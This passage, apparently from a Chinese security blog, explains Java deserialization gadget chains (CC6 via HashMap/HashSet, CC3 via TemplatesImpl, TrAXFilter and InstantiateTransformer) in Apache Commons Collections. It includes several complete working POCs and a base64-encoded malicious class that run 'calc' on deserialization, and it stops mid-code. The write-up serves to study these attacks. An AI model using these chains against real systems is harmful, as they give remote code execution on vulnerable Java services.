也就是调用了HashMap的put方法并传入了一个key为fupanc，value为1的键值对（Key=fupanc，Value=1），所以我们在反序列化的时候会因为对象中有这个键为fupanc的键值对而失败。\n解决方法：很简单，在调用put方法后，我们再调用remove方法来删掉这个键值对即可（一定要注意键值对所属对象的问题）。\n那么最终的POC为：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 package org.example; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import java.util.HashMap; import java.util.Map; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.Runtime; import java.lang.reflect.Field; public class Main{ public static void main(String[] args) throws Exception { Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainpart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); Map haha = new HashMap(); Map lazy = LazyMap.decorate(haha,chain); TiedMapEntry outerMap = new TiedMapEntry(lazy,\u0026#34;fupanc\u0026#34;); HashMap hashMap = new HashMap(); hashMap.put(outerMap,\u0026#34;fupanc\u0026#34;); haha.remove(\u0026#34;fupanc\u0026#34;);//这里注意fupanc所属对象，使用lazy也行 Field x = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); x.setAccessible(true); x.set(chain,chainpart); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashMap); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } } 成功弹出计算机：\n问题总结 总结前面的问题：\n无法序列化Process对象问题 序列化之前弹计算机的解决方法 需要remove的原因。 利用HashSet链 ysoserial链介绍了java.util.HashSet作为反序列化的入口，在HashSet类的readObject()方法的最后，会触发map.put方法：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException { // Consume and ignore stream fields (currently zero). s.readFields(); // Read capacity and verify non-negative. int capacity = s.readInt(); if (capacity \u0026lt; 0) { throw new InvalidObjectException(\u0026#34;Illegal capacity: \u0026#34; + capacity); } // Read load factor and verify positive and non NaN. float loadFactor = s.readFloat(); if (loadFactor \u0026lt;= 0 || Float.isNaN(loadFactor)) { throw new InvalidObjectException(\u0026#34;Illegal load factor: \u0026#34; + loadFactor); } // Clamp load factor to range of 0.25...4.0. loadFactor = Math.min(Math.max(0.25f, loadFactor), 4.0f); // Read size and verify non-negative. int size = s.readInt(); if (size \u0026lt; 0) { throw new InvalidObjectException(\u0026#34;Illegal size: \u0026#34; + size); } // Set the capacity according to the size and load factor ensuring that // the HashMap is at least 25% full but clamping to maximum capacity. capacity = (int) Math.min(size * Math.min(1 / loadFactor, 4.0f), HashMap.MAXIMUM_CAPACITY); // Constructing the backing map will lazily create an array when the first element is // added, so check it before construction. Call HashMap.tableSizeFor to compute the // actual allocation size. Check Map.Entry[].class since it\u0026#39;s the nearest public type to // what is actually created. SharedSecrets.getJavaOISAccess() .checkArray(s, Map.Entry[].class, HashMap.tableSizeFor(capacity)); // Create backing HashMap map = (((HashSet\u0026lt;?\u0026gt;)this) instanceof LinkedHashSet ? new LinkedHashMap\u0026lt;E,Object\u0026gt;(capacity, loadFactor) : new HashMap\u0026lt;E,Object\u0026gt;(capacity, loadFactor)); // Read in all elements in the proper order. for (int i=0; i\u0026lt;size; i++) { @SuppressWarnings(\u0026#34;unchecked\u0026#34;) E e = (E) s.readObject(); map.put(e, PRESENT); } } 重点就是最后的for循环： 这里的map同样是一个HashMap对象，HashSet类初始化时基本都是将map设置为一个初始化的HashMap类：\n等构造方法。\n而HashMap.put方法前面也说过，源码放过来一下：\n所以然后调用hash() ==\u0026gt; hashCode() ==\u0026gt; getValue() ==\u0026gt; get() ==\u0026gt; transform()也就是我们已经熟悉的操作了。\n所以在前面的HashSet#readObject()中的e需要为TiedMapEntrry类实例\n来稍微看一下HashSet类的变量：\n这里直接说明了PRESENT的值为Object类的实例。并且注意看HashSet类的构造方法，基本上都是直接将map定义为HashMap类的实例。所以这里在利用HaseSet类时直接放心将map直接当做HashMap对象即可。\n同时在HashSet中提供了一个add方法： 这个方法的作用就是向 HashSet 中添加一个元素。如果该元素已经存在于 HashSet 中，那么不会添加，并且返回 false。否则，会将该元素添加到 HashSet 中，并返回 true。\n测试一下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 import java.util.HashSet; public class Main{ public static void main(String[] args) { HashSet hash = new HashSet(); System.out.println(hash.add(\u0026#34;fupanc\u0026#34;)); System.out.println(hash.add(\u0026#34;haha\u0026#34;)); System.out.println(hash.add(\u0026#34;fupanc\u0026#34;)); } } /*output: true true false 调试一下，在true部分加断点： 进入add()方法源码\n随后确实进入了put方法，：\n同时跟一下源码，确实进行了在HashMap中的put操作。为了方便理解这里的返回true和false的区别，还是用代码来说明：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 import java.util.HashSet; import java.util.HashMap; public class Main{ public static void main(String[] args) { HashSet hash = new HashSet(); System.out.println(hash.add(\u0026#34;fupanc\u0026#34;)); System.out.println(hash.add(\u0026#34;haha\u0026#34;)); System.out.println(hash.add(\u0026#34;fupanc\u0026#34;)); // HashMap hashMap = new HashMap(); System.out.println(hashMap.put(\u0026#34;fupanc\u0026#34;,\u0026#34;xxxx\u0026#34;)); System.out.println(hashMap.put(\u0026#34;fupanc\u0026#34;,\u0026#34;xxxx\u0026#34;)); } } /*output: true true false null xxxx 也就是在HashMap的put方法中，如果没有键则会成功放入键值对并返回null，否则就会返回键对应的值。\n现在对于前面的add方法返回的布尔值就很好理解了：\n因为成功put进了fupan键和haha键，所以返回null，与add方法中定义的map.put(e, PRESENT)==null等号成立，返回ture，表明成功放入键值对， 而由于前面已经put进了fupanc键，导致再次调用put添加fupanc键返回的是前面定义的fupanc键的value，在这里也就是Object类的实例，但这样并不与null相同，所以返回的是false，表明并没有成功放入键值对 现在也就基本通了，结合前面的HashMap的理解，可以直接编写下面的POC来测试一下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 package org.example; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import java.util.HashSet; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Field; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectOutputStream; import java.io.ObjectInputStream; public class Main{ public static void main(String[] args) throws Exception { Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainPart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); HashMap haha =new HashMap(); Map lazy = LazyMap.decorate(haha,chain); TiedMapEntry outerMap = new TiedMapEntry(lazy,\u0026#34;fupanc\u0026#34;); HashSet hashSet = new HashSet(); hashSet.add(outerMap); haha.remove(\u0026#34;fupanc\u0026#34;); Field field1 = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); field1.setAccessible(true); field1.set(chain,chainPart); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashSet); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } } 运行后成功弹出计算机：\n需要注意的地方和前面HashMap利用链差不多，说到底这个HashSet也就是间接调用HashMap的put方法，本质是一样的。\n好处 这两个利⽤链可以在Java 7和8的⾼版本触发，应该是通杀Java7、8版本的。\n","date":"2024-07-19T22:53:06+08:00","permalink":"https://fupanc-w1n.github.io/p/cc6/","title":"CC6"},{"content":"CC3 CC3就是将CC1和CC6调用链和动态加载字节码加在一起，所以需要有动态加载字节码的知识。\n利用TemplatesImpl构造CC3 在前面博客的文章中，讲述了Java中动态加载字节码的方法，其中就说明了TemplatesImpl的用法，通过调用其newTransformer()来实现链子的起点\n在动态加载字节码中，利用TemplatesImpl构建的POC为：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.util.Base64; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Base64.getDecoder().decode(\u0026#34;xxx\u0026#34;); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); ctf.newTransformer(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 恶意类的示例代码为：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 import java.io.IOException; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; public class Test extends AbstractTranslet { public Test() throws IOException { Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } 想要在反序列化中利用TemplatesImpl来加载字节码，需要在反序列化中执行TemplatesImpl对象的newTransformer或getOutputProperties方法\n结合在CC1中的TransformedMap链的基本代码的简化代码，可以如下构造：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.util.Base64; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.Transformer; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Base64.getDecoder().decode(\u0026#34;xxx\u0026#34;); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer[] chainPart = new Transformer[]{new ConstantTransformer(ctf),new InvokerTransformer(\u0026#34;newTransformer\u0026#34;,null,null)}; Transformer chain = new ChainedTransformer(chainPart); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 现在就是看如何接入了CC链了\n结合CC1 测试环境： commons-collections 3.2.1 JDK 8u65 CC3（TransformedMap链） POC：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.lang.reflect.Constructor; import java.lang.annotation.Retention; import java.lang.Class; import java.util.Base64; import java.util.Map; import java.util.HashMap; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.map.TransformedMap; import java.io.ObjectOutputStream; import java.io.ObjectInputStream; import java.io.FileOutputStream; import java.io.FileInputStream; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Base64.getDecoder().decode(\u0026#34;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQASTG9yZy9leGFtcGxlL1Rlc3Q7AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAlUZXN0LmphdmEMAAcACAcAJwwAKAApAQAEY2FsYwwAKgArAQAQb3JnL2V4YW1wbGUvVGVzdAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABgAAAAAAAwABAAcACAACAAkAAABAAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAIACgAAAA4AAwAAAAoABAALAA0ADAALAAAADAABAAAADgAMAA0AAAAOAAAABAABAA8AAQAQABEAAgAJAAAAPwAAAAMAAAABsQAAAAIACgAAAAYAAQAAAA8ACwAAACAAAwAAAAEADAANAAAAAAABABIAEwABAAAAAQAUABUAAgAOAAAABAABABYAAQAQABcAAgAJAAAASQAAAAQAAAABsQAAAAIACgAAAAYAAQAAABIACwAAACoABAAAAAEADAANAAAAAAABABIAEwABAAAAAQAYABkAAgAAAAEAGgAbAAMADgAAAAQAAQAWAAEAHAAAAAIAHQ==\u0026#34;); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer[] chainPart = new Transformer[]{new ConstantTransformer(ctf),new InvokerTransformer(\u0026#34;newTransformer\u0026#34;,null,null)}; Transformer chain = new ChainedTransformer(chainPart); Map hashMap = new HashMap(); hashMap.put(\u0026#34;value\u0026#34;,\u0026#34;xxxx\u0026#34;); Map outerMap = TransformedMap.decorate(hashMap,null,chain); Constructor constructor1 = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;).getDeclaredConstructor(Class.class,Map.class); constructor1.setAccessible(true); Object o = constructor1.newInstance(Retention.class,outerMap); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(o); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 成功弹出计算机，其实就是将前面的链式执行命令改了一下。\n这里要说明一个东西，就是利用链的InvokerTransformer初始化那里，可以和前面的CC1对比一下：\n如果 paramTypes 和 args 是 null，它们表示该方法没有参数。而如果它们是 new Class[]{null} 和 new Object[]{null}，这实际上是表示该方法有一个参数，但是该参数的类型和值都是 null，这种情况很可能导致方法调用失败，因为实际调用的方法没有参数，而代码却试图用一个 null 类型和 null 值进行调用。\n所以上面代码需要直接用两个null表示无参数的方法\nCC3（LazyMap链） POC（前面用的base64，这里就用IO读文件）：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.lang.reflect.Constructor; import java.lang.annotation.Retention; import java.lang.Class; import java.lang.reflect.InvocationHandler; import java.util.Map; import java.util.HashMap; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.map.LazyMap; import java.io.ObjectOutputStream; import java.io.ObjectInputStream; import java.io.FileOutputStream; import java.io.FileInputStream; import java.nio.file.Files; import java.nio.file.Paths; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; public class Main { public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer[] chainPart = new Transformer[]{new ConstantTransformer(ctf),new InvokerTransformer(\u0026#34;newTransformer\u0026#34;,null,null)}; Transformer chain = new ChainedTransformer(chainPart); Map hashMap = new HashMap(); Map outerMap = LazyMap.decorate(hashMap,chain); Constructor con = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;).getDeclaredConstructor(Class.class,Map.class); con.setAccessible(true); InvocationHandler proxy = (InvocationHandler) con.newInstance(Retention.class,outerMap); Map proxyMap = (Map)Proxy.newProxyInstance(LazyMap.class.getClassLoader(),LazyMap.class.getInterfaces(),proxy); Object o = con.newInstance(Retention.class,proxyMap); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(o); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 成功弹出计算机。\n局限 也就是CC1的局限，在JDK 8u71后就不能再使用了。\n结合CC6 测试环境： commons-collections 3.2.1 JDK 8u411 CC3（HashMap链） POC：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.util.Map; import java.util.HashMap; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.ObjectOutputStream; import java.io.ObjectInputStream; import java.io.FileOutputStream; import java.io.FileInputStream; import java.nio.file.Files; import java.nio.file.Paths; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainPart = new Transformer[]{new ConstantTransformer(ctf),new InvokerTransformer(\u0026#34;newTransformer\u0026#34;,null,null)}; Transformer chain = new ChainedTransformer(fakeTransformer); Map hashMap = new HashMap(); Map lazy = LazyMap.decorate(hashMap,chain); TiedMapEntry outerMap = new TiedMapEntry(lazy,\u0026#34;fupanc\u0026#34;); HashMap o = new HashMap(); o.put(outerMap,\u0026#34;xxxx\u0026#34;); hashMap.remove(\u0026#34;fupanc\u0026#34;); Field field1 = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); field1.setAccessible(true); field1.set(chain,chainPart); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(o); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 成功弹出计算机。\nCC3（HashSet链） 和HashMap差不多，POC如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.util.Map; import java.util.HashMap; import java.util.HashSet; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.ObjectOutputStream; import java.io.ObjectInputStream; import java.io.FileOutputStream; import java.io.FileInputStream; import java.nio.file.Files; import java.nio.file.Paths; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainPart = new Transformer[]{new ConstantTransformer(ctf),new InvokerTransformer(\u0026#34;newTransformer\u0026#34;,null,null)}; Transformer chain = new ChainedTransformer(fakeTransformer); Map hashMap = new HashMap(); Map lazy = LazyMap.decorate(hashMap,chain); TiedMapEntry outerMap = new TiedMapEntry(lazy,\u0026#34;fupanc\u0026#34;); HashSet hash = new HashSet(); hash.add(outerMap); hashMap.remove(\u0026#34;fupanc\u0026#34;); Field field1 = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); field1.setAccessible(true); field1.set(chain,chainPart); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hash); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } InstantiateTransformer 测试环境： commons-collections 3.2.1 JDK 8u65 分析 ysoserial的CC3的POC没有用InvokerTransformer来执行newTransformer方法，而是用的InstantiateTransformer类： InstantiateTransformer类位于org.apache.commons.collections.functors.InstantiateTransformer，\n来看这个类用到的源码\n构造方法：\ntransform方法：\n可以看到这里的transform方法就是可以实例化一个类的。\n继续看ysoserial的利用链：\n1 2 3 4 5 Transformer[] transformers = new Transformer[] { new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer( new Class[] { Templates.class }, new Object[] { templatesImpl } )}; 它前面传入了一个TrAXFilter.class，这个TrAXFilter类位置是com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter。\n在TrAXFilter类中，有地方调用了newTransformer()方法： 这也就是在ysoserial利用链中传入Templates.class的原因（Templates接口类位于javax.xml.transform.Templates），现在大概就清楚了，\n只要我们将一个设置好了的TemplatesImpl类赋值给一个变量，再将那个变量传进去当做TrAXFilter的参数变量templates的值，这样就会自然调用到TemplatesImpl类的newTransformer()方法，还是简单给个代码，就像如下：\n1 2 3 4 5 6 7 8 byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\java_text\\\\java-1\\\\out\\\\production\\\\java-1\\\\Test.class\u0026#34;)); TemplatesImpl templatesImpl = new TemplatesImpl(); setFieldValue(templatesImpl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(templatesImpl,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(templatesImpl, \u0026#34;_class\u0026#34;, null); setFieldValue(templatesImpl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer[] chainPart = new Transformer[]{new ConstantTransformer(TrAXFilter.class),new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templatesImpl})}; 就是如上，这样InstantiateTransformer的transformer()方法就可以在获取TrAXFilter类的构造方法后再调用newInstance()方法将这个TrAXFilter类实例化，在实例化的过程中，自然就会调用TemplatesImpl的newTransformer()方法：\n那么现在就可以尝试构造了。\nPOC 结合CC1 CC1的TransformedMap链：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import 